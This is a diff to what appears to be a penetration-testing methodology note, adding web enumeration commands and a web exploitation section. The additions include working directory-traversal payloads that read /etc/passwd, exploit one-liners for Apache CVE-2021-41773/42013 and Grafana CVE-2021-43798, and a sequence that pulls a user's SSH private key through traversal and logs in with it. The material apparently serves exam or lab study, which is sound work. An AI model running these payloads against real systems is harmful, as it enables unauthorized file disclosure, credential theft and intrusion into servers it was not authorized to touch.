@@ -39,14 +39,26 @@ nmap -v -sU -T4 -Pn --top-ports 100 -oA nmap_udp <target>
 - SNMP (161) - misconfigurations
 - MySQL/PostgreSQL (3306, 5432) - default creds
 
-#### Step 2: Web Enumeration
+#### Step 2: Web Application Enumeration
+> Full walkthrough (Nmap web fingerprinting, Wappalyzer, Gobuster incl. API pattern brute force, Burp Suite Proxy/Repeater/Intruder, XSS): [[Introduction to Web Application Attacks]]
+
 ```bash
+# Web server fingerprinting
+nmap -p80 -sV <target>
+nmap -p80 --script=http-enum <target>
+
 # Directory brute force
 gobuster dir -u http://<target> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,sh,cgi
+
+# API path brute force (pattern file containing {GOBUSTER}/v1 etc.)
+gobuster dir -u http://<target>:<port> -w /usr/share/wordlists/dirb/big.txt -p pattern
 
 # Tech stack identification
 whatweb http://<target>
 wpscan --url http://<target> --enumerate p,vt
+
+# robots.txt / sitemap check
+curl http://<target>/robots.txt
 ```
 
 **What to look for**:
@@ -56,6 +68,8 @@ wpscan --url http://<target> --enumerate p,vt
 - `.git` - source code exposure
 - `/uploads` - file upload vulnerabilities
 - `/cgi-bin` - potential RCE
+- API endpoints (`/<name>/v1`, `/<name>/v2`) - probe with `curl`, watch for `405` vs `404` to confirm a path exists under a different HTTP method
+- Stored/reflected XSS - test `< > ' " { } ;` in any input that gets echoed back unsanitized
 
 #### Step 3: Service-Specific Enumeration
 ```bash
@@ -96,6 +110,38 @@ searchsploit <software> <version>
 # SQL injection (manual first)
 sqlmap -u "http://target/page?id=1" --batch
 ```
+
+#### Step 1b: Web Application Exploitation
+> Full walkthrough (Directory Traversal so far; File Inclusion/Upload/Command Injection to follow): [[Common Web Application Attacks]]
+
+```bash
+# Directory Traversal / LFI probe. Swap in likely parameter names (page, file, path, template, doc...)
+curl "http://<target>/index.php?page=../../../../../../../../../etc/passwd"
+curl "http://<target>/index.php?page=..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"   # URL-encoded variant
+curl "http://<target>/index.php?page=..\..\..\..\..\..\windows\system32\drivers\etc\hosts"  # Windows target, try backslash too
+
+# If plain ../ 404s / gets filtered, try percent-encoding the dots. Bypasses filters matching only the literal string
+curl "http://<target>/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+# Apache CVE-2021-41773/42013 specifically wants an asymmetric first segment. Try this exact pattern if the uniform one above 404s regardless of depth:
+curl --path-as-is "http://<target>/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+
+# Grafana CVE-2021-43798 (any core plugin path works, alertlist always present, no auth needed)
+curl http://<target>:3000/api/health   # confirm version is 8.0.0-beta1 through 8.3.0
+curl --path-as-is "http://<target>:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd"
+
+# Extract a multi-line secret (private key, cert) found via traversal. NEVER copy/paste manually, extract mechanically
+curl -s "http://<target>/index.php?page=../../../../../../home/<user>/.ssh/id_rsa" -o raw_response.txt
+sed -n '/-----BEGIN OPENSSH PRIVATE KEY-----/,/-----END OPENSSH PRIVATE KEY-----/p' raw_response.txt > stolen_key
+chmod 400 stolen_key
+ssh -i stolen_key <user>@<target>   # add -p <port> if non-standard
+```
+
+**What to look for**:
+- Any parameter whose value looks like a filename (`page=`, `file=`, `template=`, `lang=`). Classic LFI/traversal injection point
+- `/etc/passwd` (Linux) or `C:\Windows\System32\drivers\etc\hosts` (Windows) to confirm the traversal works at all
+- Once confirmed, hunt disclosed usernames' home directories for `.ssh/id_rsa`. Often world-readable, a direct path to a shell via SSH
+- On Windows, no direct traversal-to-shell equivalent exists. Research the specific web server/framework's known sensitive file paths instead (e.g. IIS: `C:\inetpub\wwwroot\web.config`, `C:\inetpub\logs\LogFiles\W3SVC1\`)
+- If a retrieved secret fails to load with a vague "unsupported"/"can't parse" error from **any** tool, suspect transcription corruption first. Re-extract mechanically and `diff` before chasing library-compatibility theories
 
 #### Step 2: Shells & Payloads
 
